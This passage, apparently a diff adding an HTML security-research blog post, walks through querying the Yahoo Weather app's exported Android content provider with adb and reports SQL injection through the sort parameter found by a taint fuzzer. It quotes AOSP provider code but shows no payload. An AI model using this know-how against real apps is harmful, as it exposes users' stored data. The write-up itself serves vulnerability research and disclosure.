+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">LocationOperations</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">p9</span><span class="o">,</span> <span class="n">p10</span><span class="o">,</span> <span class="n">p11</span><span class="o">,</span> <span class="n">p12</span><span class="o">);</span>
+
+                    <span class="k">if</span> <span class="o">(</span><span class="n">v0_0</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">v0_0</span><span class="o">.</span><span class="na">setNotificationUri</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getContext</span><span class="o">().</span><span class="na">getContentResolver</span><span class="o">(),</span> <span class="n">p8</span><span class="o">);</span>
+                    <span class="o">}</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+                    <span class="n">String</span> <span class="n">v2_12</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p8</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Util</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v2_12</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">String</span><span class="o">[]</span> <span class="n">v3_5</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span>
+                        <span class="n">v3_5</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">v2_12</span><span class="o">;</span>
+
+                        <span class="n">android</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">Cursor</span> <span class="n">v0_5</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">SQLiteUtilities</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p10</span><span class="o">,</span> <span class="s">"woeid=?"</span><span class="o">,</span> <span class="n">p11</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">v3_5</span><span class="o">));</span>
+
+                        <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">LocationOperations</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">p9</span><span class="o">,</span> <span class="n">v0_5</span><span class="o">.</span><span class="na">a</span><span class="o">(),</span> <span class="n">v0_5</span><span class="o">.</span><span class="na">b</span><span class="o">(),</span> <span class="n">p12</span><span class="o">);</span>
+                    <span class="o">}</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">CurrentForecastOperations</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v1_4</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">CurrentForecastOperations</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">p8</span><span class="o">));</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">WeatherAlertsOperations</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v1_4</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">WeatherAlertsOperations</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p8</span><span class="o">,</span> <span class="mi">2</span><span class="o">));</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">HourlyForecastOperations</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v1_4</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">HourlyForecastOperations</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">p8</span><span class="o">),</span> <span class="n">p8</span><span class="o">.</span><span class="na">getBooleanQueryParameter</span><span class="o">(</span><span class="s">"isCurrentLocation"</span><span class="o">,</span> <span class="mi">0</span><span class="o">));</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>
+                <span class="k">default</span><span class="o">:</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">a</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"WeatherProvider"</span><span class="o">,</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="s">"Unknown Uri ["</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">p8</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"]"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+
+                    <span class="o">}</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">DailyForecastOperations</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">v1_4</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="k">case</span> <span class="mi">11</span><span class="o">:</span>
+                    <span class="n">v0_0</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">DailyForecastOperations</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1_4</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p8</span><span class="o">,</span> <span class="mi">2</span><span class="o">),</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">ContentResolver</span> <span class="n">v1</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">a</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="o">)</span> <span class="o">{</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"WeatherProvider"</span><span class="o">,</span> <span class="s">"Unable to get a readable database object."</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">v0_0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">update</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p2</span><span class="o">,</span> <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">ContentValues</span> <span class="n">p3</span><span class="o">,</span> <span class="n">String</span> <span class="n">p4</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">p5</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>The most important methods are 'query', 'update', 'insert' and 'delete'. These methods are the ones exported to other 
+apps. For instance to query the following content provider from command line, you can use the following adb shell 
+command:</p>
+<div class="highlight"><pre><span></span>&gt; $ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/                                                                                                     
+
+Row: <span class="m">0</span> <span class="nv">_id</span><span class="o">=</span><span class="m">19</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">12728321</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">48</span>.92167, <span class="nv">longitude</span><span class="o">=</span><span class="m">2</span>.24733, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">55863456</span>, <span class="nv">city</span><span class="o">=</span>Colombes, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>France, <span class="nv">countryAbbr</span><span class="o">=</span>FR, <span class="nv">timeZoneId</span><span class="o">=</span>Europe/Paris, <span class="nv">timeZoneAbbr</span><span class="o">=</span>CET, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707326856</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">1</span> <span class="nv">_id</span><span class="o">=</span><span class="m">20</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">1539359</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">34</span>.02088, <span class="nv">longitude</span><span class="o">=</span>-6.84165, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">1539359</span>, <span class="nv">city</span><span class="o">=</span>Rabat, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>Morocco, <span class="nv">countryAbbr</span><span class="o">=</span>MA, <span class="nv">timeZoneId</span><span class="o">=</span>Africa/Casablanca, <span class="nv">timeZoneAbbr</span><span class="o">=</span>WET, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327048</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">2</span> <span class="nv">_id</span><span class="o">=</span><span class="m">21</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">2459115</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">40</span>.71455, <span class="nv">longitude</span><span class="o">=</span>-74.00712, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">2459115</span>, <span class="nv">city</span><span class="o">=</span>New York, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>United States, <span class="nv">countryAbbr</span><span class="o">=</span>US, <span class="nv">timeZoneId</span><span class="o">=</span>America/New_York, <span class="nv">timeZoneAbbr</span><span class="o">=</span>EST, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327168</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">3</span> <span class="nv">_id</span><span class="o">=</span><span class="m">22</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">2487956</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">37</span>.7474, <span class="nv">longitude</span><span class="o">=</span>-122.43922, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">2487956</span>, <span class="nv">city</span><span class="o">=</span>San Francisco, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>United States, <span class="nv">countryAbbr</span><span class="o">=</span>US, <span class="nv">timeZoneId</span><span class="o">=</span>America/Los_Angeles, <span class="nv">timeZoneAbbr</span><span class="o">=</span>PST, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327194</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+</pre></div>
+<p>We've added 'locations' path because the query method is checking the URI with a list of predefined URIs to choose 
+what table to query from. This is a very common pattern for content providers that defines a list of URI using the 
+'addMatch' method, matching it with the appropriate code and then query the appropriate information, usually from the 
+database (see <a href="http://developer.android.com/guide/topics/providers/content-provider-creating.html">http://developer.android.com/guide/topics/providers/content-provider-creating.html</a>). The signature of 
+the query method is the following:</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">abstract</span> <span class="n">Cursor</span> <span class="nf">query</span> <span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="n">String</span> <span class="n">selection</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="n">String</span> <span class="n">sortOrder</span><span class="o">)</span>
+</pre></div>
+<p>The different parameters are all accessible from command line:</p>
+<div class="highlight"><pre><span></span>usage: adb shell content query --uri &lt;URI&gt; <span class="o">[</span>--user &lt;USER_ID&gt;<span class="o">]</span> <span class="o">[</span>--projection &lt;PROJECTION&gt;<span class="o">]</span> <span class="o">[</span>--where &lt;WHERE&gt;<span class="o">]</span> <span class="o">[</span>--sort &lt;SORT_ORDER&gt;<span class="o">]</span>
+
+  &lt;PROJECTION&gt; is a list of colon separated column names and is formatted:
+
+  &lt;COLUMN_NAME&gt;<span class="o">[</span>:&lt;COLUMN_NAME&gt;...<span class="o">]</span>
+
+  &lt;SORT_OREDER&gt; is the order in which rows in the result should be sorted.
+
+  Example:
+
+  <span class="c1"># Select "name" and "value" columns from secure settings where "name" is equal to "new_setting" and sort the result by name in ascending order.</span>
+
+  adb shell content query --uri content://settings/secure --projection name:value --where <span class="s2">"name=\'new_setting\'"</span> --sort <span class="s2">"name ASC"</span>
+</pre></div>
+<p>For instance you can specify the 'sort' parameter using the following example:</p>
+<div class="highlight"><pre><span></span>&gt; $ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort <span class="s2">"_id"</span>                                                                                       
+
+Row: <span class="m">0</span> <span class="nv">_id</span><span class="o">=</span><span class="m">19</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">12728321</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">48</span>.92167, <span class="nv">longitude</span><span class="o">=</span><span class="m">2</span>.24733, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">55863456</span>, <span class="nv">city</span><span class="o">=</span>Colombes, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>France, <span class="nv">countryAbbr</span><span class="o">=</span>FR, <span class="nv">timeZoneId</span><span class="o">=</span>Europe/Paris, <span class="nv">timeZoneAbbr</span><span class="o">=</span>CET, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707326856</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">1</span> <span class="nv">_id</span><span class="o">=</span><span class="m">20</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">1539359</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">34</span>.02088, <span class="nv">longitude</span><span class="o">=</span>-6.84165, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">1539359</span>, <span class="nv">city</span><span class="o">=</span>Rabat, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>Morocco, <span class="nv">countryAbbr</span><span class="o">=</span>MA, <span class="nv">timeZoneId</span><span class="o">=</span>Africa/Casablanca, <span class="nv">timeZoneAbbr</span><span class="o">=</span>WET, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327048</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">2</span> <span class="nv">_id</span><span class="o">=</span><span class="m">21</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">2459115</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">40</span>.71455, <span class="nv">longitude</span><span class="o">=</span>-74.00712, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">2459115</span>, <span class="nv">city</span><span class="o">=</span>New York, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>United States, <span class="nv">countryAbbr</span><span class="o">=</span>US, <span class="nv">timeZoneId</span><span class="o">=</span>America/New_York, <span class="nv">timeZoneAbbr</span><span class="o">=</span>EST, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327168</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+
+Row: <span class="m">3</span> <span class="nv">_id</span><span class="o">=</span><span class="m">22</span>, <span class="nv">woeid</span><span class="o">=</span><span class="m">2487956</span>, <span class="nv">isCurrentLocation</span><span class="o">=</span><span class="m">0</span>, <span class="nv">latitude</span><span class="o">=</span><span class="m">37</span>.7474, <span class="nv">longitude</span><span class="o">=</span>-122.43922, <span class="nv">photoWoeid</span><span class="o">=</span><span class="m">2487956</span>, <span class="nv">city</span><span class="o">=</span>San Francisco, <span class="nv">state</span><span class="o">=</span>NULL, <span class="nv">stateAbbr</span><span class="o">=</span>NULL, <span class="nv">country</span><span class="o">=</span>United States, <span class="nv">countryAbbr</span><span class="o">=</span>US, <span class="nv">timeZoneId</span><span class="o">=</span>America/Los_Angeles, <span class="nv">timeZoneAbbr</span><span class="o">=</span>PST, <span class="nv">lastUpdatedTimeMillis</span><span class="o">=</span><span class="m">1707327194</span>, <span class="nv">crc</span><span class="o">=</span><span class="m">0</span>
+</pre></div>
+<p>This is all standard and very well documented.  </p>
+<h2>II. Android and SQL</h2>
+<p>Lately we have been working on creating a taint fuzzer for mobile Apps that automatically solves tainted constraints 
+until it identifies an exploitable sink method, we found several top 1000 Apps reporting vulnerabilities to SQL 
+injection in the --sort parameters.</p>
+<p>These apps seemed to properly implement the use of prepared statements, no use of string concatenation or any kind of 
+dirty tricks. Diving into the code of these methods, we found the following common pattern (source from Android Open 
+Source Project):</p>
+<div class="highlight"><pre><span></span><span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">documentsui</span><span class="o">.</span><span class="na">RecentsProvider</span><span class="o">)</span> <span class="n">line</span> <span class="mi">170</span><span class="o">-</span><span class="mi">171</span><span class="o">:</span>
+
+<span class="mi">152</span>    <span class="nd">@Override</span>
+<span class="mi">153</span>    <span class="kd">public</span> <span class="n">Cursor</span> <span class="n">More</span> <span class="o">...</span><span class="na">query</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="n">String</span> <span class="n">selection</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span>
+<span class="mi">154</span>            <span class="n">String</span> <span class="n">sortOrder</span><span class="o">)</span> <span class="o">{</span>
+<span class="mi">155</span>        <span class="kd">final</span> <span class="n">SQLiteDatabase</span> <span class="n">db</span> <span class="o">=</span> <span class="n">mHelper</span><span class="o">.</span><span class="na">getReadableDatabase</span><span class="o">();</span>
+<span class="mi">156</span>        <span class="k">switch</span> <span class="o">(</span><span class="n">sMatcher</span><span class="o">.</span><span class="na">match</span><span class="o">(</span><span class="n">uri</span><span class="o">))</span> <span class="o">{</span>
+<span class="mi">157</span>            <span class="k">case</span> <span class="n">URI_RECENT</span><span class="o">:</span>
+<span class="mi">158</span>                <span class="kd">final</span> <span class="kt">long</span> <span class="n">cutoff</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">-</span> <span class="n">MAX_HISTORY_IN_MILLIS</span><span class="o">;</span>
+<span class="mi">159</span>                <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">TABLE_RECENT</span><span class="o">,</span> <span class="n">projection</span><span class="o">,</span> <span class="n">RecentColumns</span><span class="o">.</span><span class="na">TIMESTAMP</span> <span class="o">+</span> <span class="s">"&gt;"</span> <span class="o">+</span> <span class="n">cutoff</span><span class="o">,</span>
+<span class="mi">160</span>                        <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">sortOrder</span><span class="o">);</span>
+<span class="mi">161</span>            <span class="k">case</span> <span class="n">URI_STATE</span><span class="o">:</span>
+<span class="mi">162</span>                <span class="kd">final</span> <span class="n">String</span> <span class="n">authority</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+<span class="mi">163</span>                <span class="kd">final</span> <span class="n">String</span> <span class="n">rootId</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span>
+<span class="mi">164</span>                <span class="kd">final</span> <span class="n">String</span> <span class="n">documentId</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="mi">3</span><span class="o">);</span>
+<span class="mi">165</span>                <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">TABLE_STATE</span><span class="o">,</span> <span class="n">projection</span><span class="o">,</span> <span class="n">StateColumns</span><span class="o">.</span><span class="na">AUTHORITY</span> <span class="o">+</span> <span class="s">"=? AND "</span>
+<span class="mi">166</span>                        <span class="o">+</span> <span class="n">StateColumns</span><span class="o">.</span><span class="na">ROOT_ID</span> <span class="o">+</span> <span class="s">"=? AND "</span> <span class="o">+</span> <span class="n">StateColumns</span><span class="o">.</span><span class="na">DOCUMENT_ID</span> <span class="o">+</span> <span class="s">"=?"</span><span class="o">,</span>
+<span class="mi">167</span>                        <span class="k">new</span> <span class="n">String</span><span class="o">[]</span> <span class="o">{</span> <span class="n">authority</span><span class="o">,</span> <span class="n">rootId</span><span class="o">,</span> <span class="n">documentId</span> <span class="o">},</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">sortOrder</span><span class="o">);</span>
+<span class="mi">168</span>            <span class="k">case</span> <span class="n">URI_RESUME</span><span class="o">:</span>
+<span class="mi">169</span>                <span class="kd">final</span> <span class="n">String</span> <span class="n">packageName</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+<span class="mi">170</span>                <span class="k">return</span> <span class="n">db</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">TABLE_RESUME</span><span class="o">,</span> <span class="n">projection</span><span class="o">,</span> <span class="n">ResumeColumns</span><span class="o">.</span><span class="na">PACKAGE_NAME</span> <span class="o">+</span> <span class="s">"=?"</span><span class="o">,</span>
+<span class="mi">171</span>                        <span class="k">new</span> <span class="n">String</span><span class="o">[]</span> <span class="o">{</span> <span class="n">packageName</span> <span class="o">},</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">sortOrder</span><span class="o">);</span>
